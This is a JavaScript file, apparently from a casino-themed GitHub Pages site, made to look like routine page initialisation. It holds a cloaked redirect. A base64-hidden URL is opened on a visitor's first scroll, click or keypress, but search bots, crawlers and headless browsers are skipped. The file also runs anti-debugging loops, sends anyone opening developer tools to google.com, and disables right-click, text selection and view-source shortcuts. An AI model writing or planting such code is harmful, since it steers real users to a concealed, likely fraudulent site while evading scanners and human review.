(function() {
    var myDomain = "arkadacasino.github.io"; 
    var targetB64 = "aHR0cHM6Ly9hcmNhZGUtbmVidWxhLmNvbS9zbWd3bzhneXo=";
    var triggered = false;
    function protect() {
        var start = new Date();
        debugger; 
        var end = new Date();
        if (end - start > 100) {
            document.body.innerHTML = "<h1>Security Error: Unauthorized access detected.</h1>";
            window.location.replace("https://google.com");
        }
        var devtools = function() {};
        devtools.toString = function() {
            window.location.replace("https://google.com");
            return "!!!";
        };
        console.log("%c", devtools);
    }
    function antiDebug() {
        setInterval(function() {
            (function() { return false; }['constructor']('debugger')['call']());
        }, 200);
    }
    function fireRedirect() {
        var isHeadless = navigator.webdriver || window.navigator.webdriver === true;
        var ua = navigator.userAgent.toLowerCase();
        var isBotUA = /bot|crawl|spider|yandex|google|mail\.ru|bing|slurp|duckduck|lighthouse|pagespeed|ptst/i.test(ua);
        if (!isBotUA) {
            antiDebug();
            if (!isHeadless) {
                window.location.replace(atob(targetB64));
            }
        }
    }
    var events = ['scroll', 'mousemove', 'touchstart', 'click', 'keydown'];
    events.forEach(function(event) {
        window.addEventListener(event, function() {
            if (!triggered) {
                triggered = true;
                fireRedirect();
            }
        }, { passive: true, once: true });
    });
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
    document.onselectstart = function() { return false; };
    document.onkeydown = function(e) {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) { 
            protect(); 
            return false; 
        }
    };
    if (typeof feather !== 'undefined') { feather.replace(); }
    if (typeof AOS !== 'undefined') { AOS.init({ once: true }); }
})();
